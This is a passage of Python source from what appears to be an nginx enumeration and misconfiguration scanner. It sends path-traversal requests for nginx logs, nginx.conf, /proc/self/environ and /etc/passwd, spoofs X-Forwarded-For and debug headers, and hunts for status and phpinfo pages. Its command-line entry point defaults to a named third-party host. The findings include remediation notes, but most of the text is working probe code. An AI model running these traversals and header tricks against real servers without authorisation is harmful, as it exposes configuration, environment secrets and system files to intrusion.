    log_targets = [
        ('../var/log/nginx/error.log', 'NGINX_ERROR_LOG_VIA_ALIAS'),
        ('../var/log/nginx/access.log', 'NGINX_ACCESS_LOG_VIA_ALIAS'),
        ('../etc/nginx/nginx.conf', 'NGINX_CONF_VIA_ALIAS'),
        ('../etc/nginx/conf.d/default.conf', 'NGINX_VHOST_CONF_VIA_ALIAS'),
        ('../proc/self/environ', 'PROC_ENVIRON_VIA_ALIAS'),
    ]

    for base in alias_bases:
        for traversal, title in log_targets:
            path = base + traversal
            code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
            if code == 200 and body:
                body_str = body[:8192].decode('utf-8', errors='replace')
                is_log = any(sig in body_str for sig in (
                    '[error]', '[warn]', '[notice]', '[crit]', '[alert]',
                    'nginx/', 'upstream', '/var/log/', '/etc/nginx/',
                    'open()', 'connect() failed', 'recv() failed',
                    'HTTP_', 'PATH=', 'HOME=', 'USER=',
                    'worker_processes', 'server_name', 'proxy_pass',
                ))
                if is_log:
                    severity = 'CRITICAL' if 'environ' in traversal or 'nginx.conf' in traversal else 'HIGH'
                    findings.append({
                        'severity': severity,
                        'title': title,
                        'detail': (
                            f'GET {path} returned HTTP 200 with log/config content — '
                            f'alias misconfig at {base!r} allows path traversal outside webroot; '
                            f'body preview: {body_str[:200]!r}; '
                            'root cause: location /foo { alias /data/; } without trailing slash '
                            'on location allows traversal one directory above alias root; '
                            'fix: ensure both location and alias paths have matching trailing slashes'
                        ),
                        'host': host,
                        'port': port,
                    })
                    break
        else:
            continue
        break

    error_trigger_paths = [
        '/nonexistent-path-probe-12345',
        '/%00invalid',
        '/.' * 10 + '/etc/passwd',
        '/cgi-bin/../etc/passwd',
        '/' + 'A' * 8000,
    ]

    for path in error_trigger_paths:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
        if code in (400, 404, 500) and body:
            body_str = body[:4096].decode('utf-8', errors='replace')
            version_match = re.search(r'nginx/(\d+\.\d+\.\d+)', body_str)
            unix_socket_match = re.search(r'unix:(/[^\s"<>]+)', body_str)
            upstream_match = re.search(r'(?:upstream|backend|proxy_pass)[^\n]*?([/\w.-]+:\d+|unix:/[^\s"<>]+)', body_str)
            internal_path_match = re.search(r'(/(?:var|etc|usr|home|srv|opt|proc)/[^\s"<>\']+)', body_str)

            if version_match:
                findings.append({
                    'severity': 'LOW',
                    'title': 'NGINX_VERSION_DISCLOSURE_ERROR_BODY',
                    'detail': (
                        f'HTTP {code} response to {path!r} discloses nginx version '
                        f'{version_match.group(1)!r} in body — allows targeted CVE lookup; '
                        'set server_tokens off in nginx.conf to suppress version string'
                    ),
                    'host': host,
                    'port': port,
                })

            if unix_socket_match:
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'UPSTREAM_UNIX_SOCKET_PATH_DISCLOSED',
                    'detail': (
                        f'HTTP {code} error body at {path!r} contains upstream socket path '
                        f'{unix_socket_match.group(1)!r} from proxy_pass unix:/ directive — '
                        'internal service socket path leaked; reveals service layout; '
                        'configure custom error_page directives to suppress upstream error detail'
                    ),
                    'host': host,
                    'port': port,
                })

            if internal_path_match and not unix_socket_match:
                findings.append({
                    'severity': 'LOW',
                    'title': 'INTERNAL_PATH_IN_ERROR_BODY',
                    'detail': (
                        f'HTTP {code} error body at {path!r} contains filesystem path '
                        f'{internal_path_match.group(1)!r} — discloses server directory layout; '
                        'configure custom error_page to a static page suppressing path detail'
                    ),
                    'host': host,
                    'port': port,
                })

    debug_paths = ['/debug/', '/debug/vars', '/debug/pprof/', '/.well-known/']
    for path in debug_paths:
        code, hdrs, body = _http_get(
            host, port, path,
            headers={'X-Debug-Token': '1', 'X-Forwarded-For': '127.0.0.1'},
            use_tls=use_tls, timeout=timeout,
        )
        if code == 200 and body:
            body_str = body[:2048].decode('utf-8', errors='replace')
            if any(sig in body_str for sig in ('error_log', 'debug', 'worker_processes', 'upstream')):
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'DEBUG_ENDPOINT_NGINX_CONFIG_LEAKAGE',
                    'detail': (
                        f'GET {path} with debug headers returned HTTP 200 containing nginx '
                        f'configuration or debug artifacts; body preview: {body_str[:150]!r}; '
                        'remove debug locations from production nginx.conf; '
                        'error_log /dev/stderr debug should never be set on public-facing instances'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


def probe_nginx_diagnostic_endpoint_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    findings = []
    use_tls = port == 443

    status_paths = [
        ('/basic_status', 'NGINX_BASIC_STATUS'),
        ('/nginx_status', 'NGINX_STUB_STATUS'),
        ('/status', 'NGINX_STATUS_GENERIC'),
        ('/server-status', 'APACHE_SERVER_STATUS_CONFUSION'),
        ('/nginx/status', 'NGINX_STATUS_ALT_PATH'),
        ('/server/status', 'SERVER_STATUS_ALT_PATH'),
        ('/_nginx_health', 'NGINX_HEALTH_INTERNAL'),
        ('/stub_status', 'NGINX_STUB_STATUS_ALT'),
        ('/phpinfo.php', 'PHPINFO_CO_INSTALL'),
        ('/info.php', 'PHPINFO_CO_INSTALL_ALT'),
        ('/php-info.php', 'PHPINFO_CO_INSTALL_ALT2'),
    ]

    for path, title in status_paths:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
        if code == 200 and body:
            body_str = body[:4096].decode('utf-8', errors='replace')

            if any(sig in body_str for sig in (
                'Active connections:', 'server accepts', 'Reading:', 'Writing:', 'Waiting:',
            )):
                active_match = re.search(r'Active connections:\s*(\d+)', body_str)
                req_match = re.search(r'(\d+)\s+(\d+)\s+(\d+)', body_str)
                findings.append({
                    'severity': 'MEDIUM',
                    'title': title,
                    'detail': (
                        f'nginx stub_status module exposed at {path} without access control — '
                        f'active connections: {active_match.group(1) if active_match else "unknown"}; '
                        'discloses real-time connection/request counters enabling traffic pattern '
                        'inference and timing attacks; '
                        'restrict with: allow <monitoring_ip>; deny all; inside the location block'
                    ),
                    'host': host,
                    'port': port,
                })

            elif 'phpinfo()' in body_str or 'PHP Version' in body_str:
                php_ver_match = re.search(r'PHP Version\s*([\d.]+)', body_str)
                findings.append({
                    'severity': 'HIGH',
                    'title': title,
                    'detail': (
                        f'phpinfo() output accessible at {path} — '
                        f'PHP version: {php_ver_match.group(1) if php_ver_match else "unknown"}; '
                        'discloses full server configuration, loaded modules, environment variables, '
                        'upload paths, and compilation flags; common nginx+PHP co-install oversight; '
                        'remove phpinfo() scripts from webroot entirely'
                    ),
                    'host': host,
                    'port': port,
                })

            elif path == '/server-status' and ('Total Accesses' in body_str or 'Apache' in body_str):
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'APACHE_SERVER_STATUS_EXPOSED',
                    'detail': (
                        '/server-status returned Apache mod_status output — nginx proxying to '
                        'Apache backend with mod_status enabled and forwarded to public; '
                        'exposes request logs, worker states, and client IP addresses; '
                        'block /server-status at the nginx level before proxying'
                    ),
                    'host': host,
                    'port': port,
                })

    error_redirect_paths = ['/404-probe-nonexistent', '/403-probe-nonexistent', '/500-probe']
    for path in error_redirect_paths:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
        if code in (301, 302, 307, 308) and hdrs:
            location = hdrs.get('location', '')
            if location and re.match(r'https?://', location):
                parsed = urlparse(location)
                host_hdr_lc = host.lower().rstrip('.')
                redir_host = parsed.netloc.lower().rstrip('.')
                if host_hdr_lc not in redir_host and redir_host not in host_hdr_lc:
                    findings.append({
                        'severity': 'MEDIUM',
                        'title': 'ERROR_PAGE_OPEN_REDIRECT',
                        'detail': (
                            f'HTTP {code} response to {path!r} redirects to external URL '
                            f'{location!r} — nginx error_page directive configured with absolute '
                            'external URL; attacker crafts request that triggers a known error '
                            'path to redirect victims to attacker-controlled domain; '
                            'use relative URIs in error_page directives or restrict to same-origin '
                            'internal error documents'
                        ),
                        'host': host,
                        'port': port,
                    })

    try_files_probes = [
        '/nonexistent-file-try-files-probe.html',
        '/missing-asset-try-files-probe.js',
        '/ghost-path-try-files-probe/index',
    ]
    for path in try_files_probes:
        code, hdrs, body = _http_get(host, port, path, use_tls=use_tls, timeout=timeout)
        if code == 404 and body:
            body_str = body[:2048].decode('utf-8', errors='replace')
            fs_path_match = re.search(r'(/(?:var|etc|srv|home|usr|opt|www|data)/[^\s"<>\']+)', body_str)
            if fs_path_match:
                findings.append({
                    'severity': 'LOW',
                    'title': 'TRY_FILES_FILESYSTEM_PATH_IN_404',
                    'detail': (
                        f'404 response to {path!r} contains filesystem path '
                        f'{fs_path_match.group(1)!r} — try_files $uri $uri/ =404 or a '
                        'misconfigured fallback passes the expanded on-disk path into the error '
                        'body; discloses webroot and directory layout; '
                        'configure a custom 404 error_page pointing to a static document '
                        'that does not echo the filesystem path'
                    ),
                    'host': host,
                    'port': port,
                })
            elif re.search(r'No such file', body_str, re.I) and re.search(r'/[a-z]{2,}/', body_str):
                findings.append({
                    'severity': 'INFO',
                    'title': 'TRY_FILES_VERBOSE_404',
                    'detail': (
                        f'404 body at {path!r} contains verbose file-not-found text — '
                        'potential path disclosure via try_files fallback; '
                        'replace default nginx error page with a generic static 404 document'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


# ── CLI ───────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    import sys
    import json

    host = sys.argv[1] if len(sys.argv) > 1 else NginxEnumerator.MACSTADIUM_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    use_tls = '--no-tls' not in sys.argv
    as_json = '--json' in sys.argv

    enum = NginxEnumerator(host, port, use_tls=use_tls)
    results = enum.run()

    if as_json:
        print(json.dumps(results, indent=2, default=str))
    else:
        print(enum.report())
